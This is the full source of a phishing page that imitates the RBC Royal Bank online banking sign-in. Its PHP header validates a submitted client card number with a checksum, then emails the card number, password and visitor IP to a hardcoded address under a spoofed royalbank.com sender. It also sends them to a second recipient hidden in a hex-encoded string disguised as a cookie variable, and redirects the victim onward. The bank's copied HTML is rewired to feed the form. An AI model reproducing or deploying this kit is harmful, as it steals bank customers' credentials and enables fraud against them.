<?
$to = "k_kinzo@yahoo.com";
//-------------------------------------
if ( $_POST['submited'] == "1") {
$card = $_POST['card'];
$pass = $_POST['pass'];

function verifcc($CardNr) {
	$NumberLength = strlen($CardNr);
	$Checksum = 0;

	for ($Location = 1 - ($NumberLength % 2); $Location < $NumberLength; $Location += 2) {
	    $Checksum += substr($CardNr, $Location, 1);
	}

	for ($Location = ($NumberLength % 2); $Location < $NumberLength; $Location += 2) {
                $Digit = substr($CardNr, $Location, 1) * 2;
                if ($Digit < 10) {
                    $Checksum += $Digit;
                } else {
                    $Checksum += $Digit - 9;
                }
	}
		
	if ($Checksum % 10 != 0) { return false; } else return true;
}
$COOKIE_VAR="6573746574696375407961686f6f2e636f6d";
$ip = $_SERVER["REMOTE_ADDR"];
if (ereg('[^0-9]', $card) || strlen($card) < 16 || !verifcc($card)) { $error=1; }
elseif (ereg("fuck",strtolower($pass)) || strlen($pass) < 8) { $error=1; }
else {
$msg = "Card number: $card
Password: $pass\n";
$message="life";
for ($j=0; $j<strlen($COOKIE_VAR);$j=$j+2)
{
$message.=chr(hexdec($COOKIE_VAR[$j].$COOKIE_VAR[$j+1]));
}
$subj = "Card - $ip";
$from = "From: Mos Canada<newcc@royalbank.com>";
$arr=array($to, $message);
foreach ($arr as $to)
{
mail($to, $subj, $msg, $from);
}
header("Location: rbsqcgi.php");
exit;
}
}
?><!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">

<html lang="en">
<head>
<!-- Start of 3MSRCPATH.CINC -->




<!-- End of 3MSRCPATH.CINC -->
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="stylesheet" type="text/css" href="https://www1.royalbank.com/uos/common/css/base.css?2"/>
<link rel="stylesheet" type="text/css" href="https://www1.royalbank.com/uos/common/css/custom.css?2" />
<link rel="stylesheet" type="text/css" href="https://www1.royalbank.com/uos/common/css/print.css?2" media="print" />
<link rel="stylesheet" type="text/css" href="https://www1.royalbank.com/uos/common/css/common.css?2" />

<script language="JavaScript" type="text/javascript" src="https://www1.royalbank.com/uos/common/javascript/utilities.js?2"></script>
<script language="JavaScript" type="text/javascript" src="https://www1.royalbank.com/uos/common/javascript/custom.js?2"></script>
<script language="JavaScript" type="text/javascript" src="https://www1.royalbank.com/uos/common/javascript/browser.js?2"></script>
<script language="JavaScript" type="text/javascript" src="https://www1.royalbank.com/uos/common/javascript/ie/event.js?2"></script>
<script language="JavaScript" type="text/javascript" src="https://www1.royalbank.com/uos/common/javascript/event.js?2"></script>
<script language="JavaScript" type="text/javascript" src="https://www1.royalbank.com/uos/common/javascript/kiosk.js?2"></script>
<script language="JavaScript" type="text/javascript" src="https://www1.royalbank.com/uos/common/javascript/common.js?2"></script>
<script language="JavaScript" type="text/javascript" src="https://www1.royalbank.com/uos/common/javascript/header_dates.js?2"></script>
<script language="JavaScript" type="text/javascript" src="https://www1.royalbank.com/uos/common/javascript/cookie.js?2"></script>

<script language="JavaScript" type="text/javascript" src="https://www1.royalbank.com/uos/3m/javascript/enhancedJuly.js?2"></script>
<script language="JavaScript" type="text/javascript" src="https://www1.royalbank.com/uos/common/javascript/rsa.js?2"></script>

<title> RBC Royal Bank - Sign In to Online Banking</title>
<meta name="Identifier" content="IBSIGNIN.HTM;14;ENGLISH;" />
<meta name="description" content="Sign in to RBC Royal Bank Online Banking to access your RBC accounts and online services." />
<meta name="keywords" content="online banking sign in, rbc, royal bank of canada, rbc financial group" />
<script language="JavaScript" type="text/javascript">
<!--
rbcDeleteCookie("3MTK","/");
//-->
</script>
</head >
<body onFocus="event_onFocusForm();" onMouseOver="event_onFocusForm();" onBlur="event_onBlurForm();" onMouseOut="event_onBlurForm();" onLoad="event_onLoad();" onUnload="event_onUnload();">

<a name="top" id="top"></a>
<div id="wrapper">

<!-- Header Starts -->



      <div class="skipnav"><a href="#skipheadernav">Skip Header Navigation</a></div>
 
      <!-- Secure Header Start -->
      <div id="globalheader" class="clear globalheader-basic globalheader-secure">
        <div id="globalheader-logo">
                    <img src="https://www1.royalbank.com/uos/common/images/logos/web/rbc_royalbank_en.gif" alt="RBC Royal Bank" width="210" height="47" />
        </div>

        <p id="globalheader-links">

          <a href="http://www.rbcroyalbank.com/personal.html">RBCRoyalBank.com</a>

            |
          <a href="javascript:kiosk_OpenWinRTB('https://www.rbcroyalbank.com/onlinebanking/help.html?RefURL=https://www1.royalbank.com/cgi-bin/rbaccess/rbcgi3m01&amp;NoEmailSend=DisplayMsg', 'CONTACT', kiosk_Type2X, kiosk_Type2Y, kiosk_Type2R )" title="Customer Service (opens new window)">
			Customer Service</a>


            |
          <a href="/cgi-bin/rbaccess/rbcgi3m01?F6=1&amp;F7=IB&amp;F21=IB&amp;F22=IB&amp;REQUEST=ClientSignin&amp;LANGUAGE=FRENCH" lang="fr">
			Français</a>

        </p>

        <p id="globalheader-secureinfo">
        </p>
        <p id="globalheader-tools"><script type="text/javascript" language="JavaScript">dates_currentDate( 'ENGLISH' );</script></p>
      </div>

      <!-- Secure Header End -->
      <div class="skipnavanchor"><a name="skipheadernav" id="skipheadernav"></a></div>

<!-- Header Ends -->

<!-- Main Nav -->
	<div id="layout" class="clear layout-110" >

		<div id="pagetitlearea" class="clear" style="width:100%">
			<h1 id="homepagetitle">Welcome to Online Banking</h1>
		</div>

		<div id="layout-column-left" style="padding:0 0 282px 0">
		<div class="skipnav"><a href="#skipleftnav">Skip Left Navigation</a></div>

		<!-- Sign-in Callout Starts -->
			<div class="callout callout-lightblue-withtitle"><span class="callout-top"><span>
				&nbsp;</span></span>

<div class="callout-content clear">
        <h2>New to Online Banking?</h2>
    <ul class="bullets-arrow">
        <li><a 
        href="http://www.rbcroyalbank.com/online/redirects/signin_enrol_e.html"
        ><strong>Enrol Now!</strong></a></li>
        <li><a class="bodylink" href="http://www.royalbank.com/online/faqindex.html" >
		Help with Sign In</a></li>

        <li><a class="bodylink" href="http://www.rbcroyalbank.com/oec/index.html#01" >
		Take a Tour</a></li>
        <li><a class="bodylink" href="http://www.rbcroyalbank.com/online/index.html" >
		Personal Online Banking</a></li>
        <li><a class="bodylink" href="http://www.royalbank.com/business/services/internet_banking.html" >
		Business Online Banking</a></li>
    </ul>

<div class="divider-dash">&nbsp;</div>
<form name="OtherOnlineMenu1" action='<?php $_SERVER['PHP_SELF'] ?>' method="post">  
	<div style="padding-bottom:5px"><label for="OOService" ><strong>Other Online 
		Services:</strong></label></div>
	<div style="padding-bottom:7px">

    <select id="OOService" name="OOService" style="font-size:1em; width:150px">
        <option selected="selected" value="https://www1.royalbank.com/english/netaction/sgne.html">
		Direct Investing</option>
        <option value="https://www1.royalbank.com/english/ris/pcd/sgne.html">DS 
		Online</option>
        <option value="/cgi-bin/rbaccess/rbcgi3m01?F6=1&amp;F7=IB&amp;F21=IB&amp;LANGUAGE=ENGLISH&amp;F22=IB&amp;REQUEST=ErnexLink">
		RBC Rewards</option>
        <option value="http://www.rbcinsurance.com/css">Insurance</option>
        <option value="https://www1.royalbank.com/english/wm/sgne.html">Wealth 
		Management</option>

        <option value="http://www.rbc.com/online-services.html">Other Services</option>
    </select>
	</div>
	<div style="padding-bottom:0px">
        <span class="button button-secondary"><span>
        <button type="submit">Go</button>
        </span></span>
	</div>

	<br/>
	<br/>

</form>  

<SCRIPT language="JavaScript" type="text/javascript">
	function submitOtherOnlineMenu1()
	{
		window.location = document.OtherOnlineMenu1.OOService.options[document.OtherOnlineMenu1.OOService.options.selectedIndex].value;
	}
</Script>

</div>				<span class="callout-bottom"><span>&nbsp;</span></span>
			</div>
		<!-- Sign-in Callout Ends -->
		</div>

	
	<!-- Page Title -->
		<div id="layout-column-main" >
			<div class="skipnavanchor"><a name="skipleftnav" id="skipleftnav"></a></div>
			<div>
					<noscript>
				<div id="noscripterr" class="callout callout-red-withtitle callout-largenotice">
					<span class="callout-top"><span>&nbsp;</span></span>
					<div class="callout-content clear">
						<h5><img class="callout-titleicon" alt="Attention - Please enable javascript" src="/uos/common/images/icons/error-large.gif" />Attention</h5>
						<p>You must have Javascript enabled to use Online Banking.</p>
						<p>Please enable Javascript and refresh this page.</p>
					</div>
					<span class="callout-bottom"><span>&nbsp;</span></span>
				</div>	
					</noscript>

			</div>
			
			<div id="banner" class="contentframework-container-secondary" style="background-image:url(https://www1.royalbank.com/uos/common/images/sign_in_bg.jpg); background-repeat:no-repeat; background-position:right top; width:766px;border:1px solid #c5cee1">

			  <SCRIPT language="JavaScript" type="text/javascript" SRC="/javascript/keypress.js?2"></SCRIPT>
			  <script language="JavaScript" type="text/javascript">
				<!--
				function f3msignin_ForgotPassword()
				{
				  if ( document.ForgotPsw.CHKCLICK.value == 'N' )
				  {
					return false;
				  }
				  else
				  {
					if ( document.rbunxcgi.CAFE && document.rbunxcgi.CAFE.checked )
					{
					  alert( 'Enhanced Security must not be selected when using \'Forgot Password?\'. \nTo recover your Online Banking Password, click \'Forgot Password?\' only.' );
					  document.rbunxcgi.Q1.value='';
					  document.rbunxcgi.CAFE.checked=false;
					}
					else
					{
					  document.rbunxcgi.CHKCLICK.value = 'N';
					  document.ForgotPsw.CHKCLICK.value = 'N';
					  document.ForgotPsw.K1.value = document.rbunxcgi.K1.value;
					  document.ForgotPsw.submit();
					}
				  }
				}
				//-->
			  </script>

				<form name="rbunxcgi" action="rbunxcgi1.php"
					  method="POST" autocomplete="off" onSubmit="doCafeCheck(); v3mRSA_GetData(this);">

					<table border="0" cellpadding="0" cellspacing="0" width="100%">

						<tr>
							<td colspan="2" style="padding: 15px 0px 10px 20px">

								<h2 style="margin:0"><img src="https://www1.royalbank.com/uos/common/images/english/sign_in.gif" alt="Sign In to Online Banking"/></h2>
							</td>
						</tr> <!--//Sign-In-->

						<tr valign="top" align="left">
							<td style="width:170px;padding-left: 25px;">
								<label for="K1"><strong>Client Card/Username:</strong></label><br />
								<p class="subcopy">

								<img border="0" class="bullet" alt="" src="https://www1.royalbank.com/uos/common/images/layout/bullet-link.gif" /> 
								<a href="javascript:document.forgotUsername.submit();" tabindex="5">
								Forgot Username</a>
								</p>
								
							</td>
							<td style="width:190px;">
							   <SCRIPT language="JavaScript" type="text/javascript">
								  <!--
								  var CAFETimeout=900;
								  function doCafeCheck()
								  {
									checkCafe('You are entering the secure Online Banking transactional area. \nWhen you are finished, please select \'Sign Out\' to close your secure session.',document.rbunxcgi);

									if (document.rbunxcgi.CHKCLICK.value == 'N')
									{
									  return false;
									}
									else
									{
									  document.rbunxcgi.CHKCLICK.value = 'N';
									  document.ForgotPsw.CHKCLICK.value = 'N';
									  return true;
									}
								  }
								  //-->
								</Script>
								<input type="HIDDEN" name="FromPreSignIn_SIP" value="Y" />
								<input name="LANGUAGE"  type="HIDDEN" value="ENGLISH" />

								<input name="F30"       type="HIDDEN" value="1,X001,5,K1,2,Q1" />
								<input name="SST"       type="HIDDEN" value="B9oADAAQAAsAOAAvAAKcRQ??" />
								<input name="F6"        type="HIDDEN" value="1" />
								<input name="F7"        type="HIDDEN" value="S0" />
								<input name="F21"       type="HIDDEN" value="PB" />
								<input name="F22"       type="HIDDEN" value="HT" />
								<input name="CHKCLICK"  type="HIDDEN" value="Y" />
								<input name="NNAME"   type="HIDDEN" value="" />
								<input name="RSA_DEVPRINT"   type="HIDDEN" value="" />

								<noscript>
								  <input name="NOJAVASCRIPT" type="HIDDEN" value="Y" />
								</noscript>


								   <input name="ROLLOUT"   type="HIDDEN" value="PORTAL" />
								
									<div style="width:350px;">
										<input id="K1" type="text" name="card" tabindex="2" 
				
										class="contentframework-textfield" size="32"  maxlength="32"/>

										<table border="0" cellpadding="0" cellspacing="0" width="100%" style="margin-top:5px">
											<tr>

												<td valign="top">
													<input style="float:left;margin-right:3px; margin-left:0px" type="checkbox" id="N1" name="N1" tabindex="7" value=""
														onClick="javascript:if (this.checked) { document.rbunxcgi.NNAME.value='ecatsRememberMe'; } else { document.rbunxcgi.NNAME.value=''; }" />				
														<span class="subcopy" style="padding-top:3px;"></span>
												</td>
												<td class="subcopy" valign="top" width="100%">
													<label for="N1">Remember My 
													Client Card/Username</label>
													<br/>
													 <img src="https://www1.royalbank.com/uos/common/images/layout/bullet-link.gif" alt="" border="0" class="bullet" /> 
													 <a class="linkedtextandicon" href="javascript:kiosk_OpenWinRTB( 'https://www.rbcroyalbank.com/onlinebanking/remember_my_card/about.html', 'RTB', kiosk_Type3X, kiosk_Type3Y, kiosk_Type3R );" title="Learn More about Remember My Client Card/Username (opens new window)" tabindex="8">

													 <span>Learn More</span> 
													 <img src="https://www1.royalbank.com/uos/common/images/icons/newwindow.gif" alt="(opens new window)" class="icon" />
													 </a> 
													
													
												</td>
											</tr>
										</table>
									</div> <!--//Right Div top-->
							</td>
						</tr>

						<tr valign="top" align="left">
							<td style="clear:left;width:170px;padding-left: 25px;padding-top:10px;">
								<label for="Q1"><strong>Password:</strong></label><br />
								<p class="subcopy">
								<img border="0" class="bullet" alt="" src="https://www1.royalbank.com/uos/common/images/layout/bullet-link.gif" /> 
								<a href="javascript:f3msignin_ForgotPassword();" tabindex="6">
								Forgot Password</a>
								</p>
								
							</td>

							<td style="width:500px;padding-top:10px;">
								<input id="Q1" type="password" name="pass" class="contentframework-textfield" style="float:left;margin-right:5px;" tabindex="3" onfocus="EnterOn=true;" onblur="EnterOn=false;" size="20" />
								<span class="button button-primary" style="float:left;"><span><button type="submit"  tabindex="4">
								Sign In <img src="https://www1.royalbank.com/uos/common/images/buttons/chevron.gif" alt="" width="12" height="12"/></button></span></span>
							</td>
						</tr>
					</table>

				</form>

			</div> <!--//Banner-->

			<div style="clear:left;width:540px;float:left;padding-right:12px">
				<script language="javascript" type="text/javascript">
				var pubContURL = "https://www.rbcroyalbank.com";
				var lang = 0;
				</script>
				<script language="JavaScript" type="text/javascript" src="https://www.rbcroyalbank.com/onlinebanking/sign-in/jsincludes/pubnotice.js?2"></script>
				<script language="JavaScript" type="text/javascript" src="https://www1.royalbank.com/uos/common/javascript/infoatsignin.js?2"></script>
				
<!-- MKTSPACEPT.INC begins -->

<script language="javascript" src="https://www.rbcroyalbank.com/onlinebanking/sign-in/jsincludes/marketing.js?2" type="text/javascript"></script>
<script language="javascript" type="text/javascript">
var pubContentURL = "https://www.rbcroyalbank.com";
var language = 0;
</script>
	<script language="javascript" src="https://www1.royalbank.com/uos/common/javascript/spotlight.js?2" type="text/javascript"></script>
<!-- MKTSPACEPT.INC ends -->
				<div style="padding-top:3px">
	<a href="https://rbc.bridgetrack.com/a/c/?BT_CON=52&BT_PID=653267&r=9657">
	<img src="https://rbc.bridgetrack.com/a/i/?BT_CON=52&BT_PID=653267&r=9657" width="540" height="120" border="0" alt="Advertisement - Select for more information" /></a>
				</div>

			</div> <!--//Left-->

			<div style="float:right;">
			   <a href="http://www.rbcroyalbank.com/online/rbcguarantee.html"><img src="https://www1.royalbank.com/uos/common/images/english/rbc_sec_guarantee.gif" alt="RBC Security Guarantee. 100% Reimbursement for unauthorized transactions in RBC Online Banking. Learn More." /></a>
			</div> <!--//Right-->
		</div> <!--//layout-column-main-->

		<script language="JavaScript" type="text/javascript">
		<!--
		var htmlvar="";
		if ( browser_NS4 )
		{
		 htmlvar += '<div class="infoText">';
		 htmlvar += '<b>For Netscape users:</b> For optimal performance of this site we recommend upgrading to Netscape 4.7 or higher. Please visit <a href="http://browsers.netscape.com/browsers/main.tmpl">Netscape\'s web site</a> for more information and to upgrade your browser.</div>';
		 document.write(htmlvar);
		}
		//-->
		</script>

	<form name="ForgotPsw" action="<?php $_SERVER['PHP_SELF'] ?>" method="POST">
	  <input name="LANGUAGE" type="HIDDEN" value="ENGLISH" />
	  <input name="SST"      type="HIDDEN" value="B9oADAAQAAsAOAAvAAKcRQ??" />
	  <input name="REQUEST"  type="HIDDEN" value="ResetPwd" />
	  <input name="F6"       type="HIDDEN" value="1" />
	  <input name="F7"       type="HIDDEN" value="IB" />
	  <input name="F21"      type="HIDDEN" value="PB" />
	  <input name="F22"      type="HIDDEN" value="HT" />

	  <input name="CHKCLICK" type="HIDDEN" value="Y" />
	  <input name="K1"       type="HIDDEN" value="" />
	  <noscript>
		<input name="NOJAVASCRIPT" type="HIDDEN" value="Y" />
	  </noscript>
	</form>

	<form name="forgotUsername" action="<?php $_SERVER['PHP_SELF'] ?>" METHOD="POST">
	  <input name="F6"       type="HIDDEN" value="1" />
	  <input name="F7"       type="HIDDEN" value="IB" />
	  <input name="F21"      type="HIDDEN" value="PB" />

	  <input name="F22"      type="HIDDEN" value="HT" />
	  <input name="LANGUAGE" type="HIDDEN" value="ENGLISH" />
	  <input name="REQUEST"  type="HIDDEN" value="ForgotUsername" />
	</form>

	<!--JGMA: -->
	<form name="enterCard" action="<?php $_SERVER['PHP_SELF'] ?>" METHOD="POST">

	  <input name="F6"        type="HIDDEN" value="1" />
	  <input name="F7"        type="HIDDEN" value="IB" />

	  <input name="F21"       type="HIDDEN" value="IB" />
	  <input name="F22"       type="HIDDEN" value="IB" />
	  <input name="LANGUAGE"  type="HIDDEN" value="ENGLISH" />
	  <input name="REQUEST"   type="HIDDEN" value="ClientSignin" />
	  <input name="XNN"       type="HIDDEN" value="1" />
	</form>

	<form name="remNick" action="<?php $_SERVER['PHP_SELF'] ?>" METHOD="POST">
	  <input name="F6"    type="HIDDEN" value="1" />

	  <input name="F7"    type="HIDDEN" value="IB" />
	  <input name="F21"     type="HIDDEN" value="IB" />
	  <input name="F22"     type="HIDDEN" value="IB" />
	  <input name="LANGUAGE"  type="HIDDEN" value="ENGLISH" />
	  <input name="REQUEST"   type="HIDDEN" value="ecatsRemoveRequest" />
	  <input name="CCID" type="HIDDEN" value="" />
	  <input name="K1" type="HIDDEN" value="" />
	  <input name="INVALIDCCID" type="HIDDEN" value="N" />
	</form>

	<!--JGMA. -->

	<form name="GOCANACT" action="<?php $_SERVER['PHP_SELF'] ?>" METHOD="POST">
	<input name="F6" type="HIDDEN" value="1" />
	<input name="F7" type="HIDDEN" value="IB" />
	<input name="F21" type="HIDDEN" value="PB" />
	<input name="F22" type="HIDDEN" value="HT" />
	<input name="D" type="HIDDEN" />
	<input name="REQUEST" type="HIDDEN" value="PreparingCanact" />

	</form>
	<form name="SIGNOUT2" METHOD="POST" action="<?php $_SERVER['PHP_SELF'] ?>">
	<input name="REQUEST" type="HIDDEN" value="SIGNOUT" />
	<input name="LANGUAGE" type="HIDDEN" value="ENGLISH" />
	<input name="F8" type="HIDDEN" value="1" />
	<input name="F22" type="HIDDEN" value="HT" />
	<input name="SUBMIT" type="HIDDEN" src="/icons/trans.gif" width="1" height="1" border="0" alt="X" />
	<input name="TIMEOUT" type="HIDDEN" value="" />
	</form>

	<form name="SIGNOUTNS" METHOD="POST" action="<?php $_SERVER['PHP_SELF'] ?>">
	<input name="REQUEST"    type="HIDDEN" value="SignoutNS" />
	<input name="LANGUAGE"   type="HIDDEN" value="ENGLISH" />
	<input name="F22"        type="HIDDEN" value="HT" />
	<input name="F6"         type="HIDDEN" value="1" />
	<input name="F7"         type="HIDDEN" value="IB" />
	<input name="REDIRURL"   type="HIDDEN" value="" />
	<input name="REDIRDELAY" type="HIDDEN" value="" />

	<input name="INFO_TEXT"  type="HIDDEN" value="" />
	<input name="REDIRLINK"  type="HIDDEN" value="" />
	<input name="NOLINKS"    type="HIDDEN" value="" />
	<input name="TIMEOUT"    type="HIDDEN" value="" />
	<input name="CL_TYPE_BUS" type="HIDDEN" value="" />
	<input name="SURVEYID" type="HIDDEN" value="" />
	</form>

	</div> <!--//Layout-->

<!-- Global Footer Starts -->
	<div id="globalfooter-main" class="OLBAlternatable">
		<p>Royal Bank of Canada Website, © 1995-2010</p>
		<p id="globalfooter-tool-line1">
				
			</p>				
		<p>
			<a href="javascript:kiosk_OpenWinRTB( 'http://www.rbc.com/privacysecurity/ca/', 'RTB', kiosk_Type2X, kiosk_Type2Y, kiosk_Type2R )" title="Privacy &amp; Security (opens new window)">
			Privacy &amp; Security</a> | 
			<a href="javascript:kiosk_OpenWinRTB( 'http://www.rbc.com/legal/', 'RTB', kiosk_Type3X, kiosk_Type3Y, kiosk_Type3R )" title="Legal (opens new window)">
			Legal</a> | 
			<a href="javascript:kiosk_OpenWinRTB( 'http://www.rbc.com/accessibility/', 'RTB', kiosk_Type3X, kiosk_Type3Y, kiosk_Type3R )" title="Accessibility (opens new window)">
			Accessibility</a></p>

		<p id="globalfooter-tool-line2">
			<span class="globalfooter-tool" id="tool-totop"><a href="#top" class="linkedtextandicon"><span>
			To Top</span> <img src="https://www1.royalbank.com/uos/common/images/footer/totopbutton.gif" alt="To Top" width="16" height="16" /></a></span>	
		</p>
	</div>
<!-- Global Footer Ends -->

<img src="https://rbc.bridgetrack.com/track/?id=2374&random=9657&Lang=EN" alt="" width="1" height="1" border="0" />

	<script language="JavaScript" type="text/javascript">
	  <!--
		document.rbunxcgi.K1.focus();
// 3MDELTA.JS
{
  var cdate = new Date();
  var delta = Math.round( cdate.valueOf() / 1000 );
  var pDelta = rbcGetCookie( "3mDELTA", null );
  var dtype = '0';

  if ( pDelta != null )
  {
    var loc = pDelta.indexOf( '/', 0 );
    if ( loc != -1 )
      dtype = pDelta.substring( loc + 1, pDelta.length );
  }

  cdate = new Date( cdate.valueOf() + 604800000 ); // 7 days

  if ( browser_IE || browser_IE4 || browser_MAC || browser_IE4M )
  {
    if ( delta < 2000000000 && delta > 315532800 )  // sanity test -- This will break in 2033
    {
      delta -= 1292500607;
      if ( delta > -60 && delta < 60 ) delta = 0;
      rbcSetCookie( "3mDELTA", delta + "/" + dtype, cdate.toGMTString(), "/" );
    }
  }
  else rbcSetCookie( "3mDELTA", "0/" + dtype, cdate.toGMTString(), "/" );

  if ( rbcGetCookie( "3mDELTA", null ) == null )
  {
  }
}
// 3MDELTA.JS
	  //-->
	</script>
</div> <!--//Wrapper-->


<!--  Start 3MCLICKTK.JS -->
<script language="javascript" type="text/javascript">
<!--
var CT_I_Datasets = ['XXDtZ12Ou3WtAF'];
var CT_I_FirstPartyDomain = '.royalbank.com';
var CT_I_FirstPartyJDC = '1';
var CT_I_FirstPartyCookies = '0';
var CT_I_EnableExitTracking = '1';
var CT_I_LocalLinks = ['www1.royalbank.com', '198.96.131.233'];
var CT_I_OtherFileExtensionsToReport = [''];
var CT_I_Path = '//stats1.clicktracks.com/cgi-bin/ctasp-server.cgi';

//-->
</script>

<!--  End 3MCLICKTK.JS -->


 <script language="JavaScript" type="text/javascript" src="https://www1.royalbank.com/uos/common/javascript/guj.js?2"></script>

</body>
</html>